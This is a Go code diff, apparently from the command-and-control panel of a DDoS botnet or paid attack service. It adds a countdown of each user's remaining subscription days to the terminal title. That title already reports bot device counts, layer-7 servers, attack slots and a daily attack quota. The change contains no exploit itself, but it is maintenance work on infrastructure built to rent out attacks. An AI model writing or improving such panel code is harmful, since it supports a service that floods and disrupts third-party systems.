@@ -23,14 +23,21 @@ func Title() {
 				// Handle the error
 			}
 
+			// Calcular días restantes hasta la expiración
+			expiryTime := time.Unix(session.User.Expiry, 0)
+			daysLeft := int(time.Until(expiryTime).Hours() / 24)
+			if daysLeft < 0 {
+				daysLeft = 0
+			}
+
 			// Check if attacks are disabled
 			if !Attacks {
-				if _, err := session.Conn.Write([]byte(fmt.Sprintf("\033]0;Devices: %d | Servers: %d | Slots: %d/%d | Sessions: %d | Attacks: Disabled \007", len(Clients), l7Count, len(slots), Options.Templates.Attacks.MaximumOngoing, len(Sessions)))); err != nil {
+				if _, err := session.Conn.Write([]byte(fmt.Sprintf("\033]0;Devices: %d | Servers: %d | Slots: %d/%d | Sessions: %d | Attacks: Disabled | Expiry: %d days \007", len(Clients), l7Count, len(slots), Options.Templates.Attacks.MaximumOngoing, len(Sessions), daysLeft))); err != nil {
 					delete(Sessions, id)
 					return
 				}
 			} else {
-				if _, err := session.Conn.Write([]byte(fmt.Sprintf("\033]0;Devices: %d | Servers: %d | Slots: %d/%d | Sessions: %d | Attacks: %d/%d \007", len(Clients), l7Count, len(slots), Options.Templates.Attacks.MaximumOngoing, len(Sessions), len(sent), session.User.MaxDaily))); err != nil {
+				if _, err := session.Conn.Write([]byte(fmt.Sprintf("\033]0;Devices: %d | Servers: %d | Slots: %d/%d | Sessions: %d | Attacks: %d/%d | Expiry: %d days \007", len(Clients), l7Count, len(slots), Options.Templates.Attacks.MaximumOngoing, len(Sessions), len(sent), session.User.MaxDaily, daysLeft))); err != nil {
 					delete(Sessions, id)
 					return
 				}
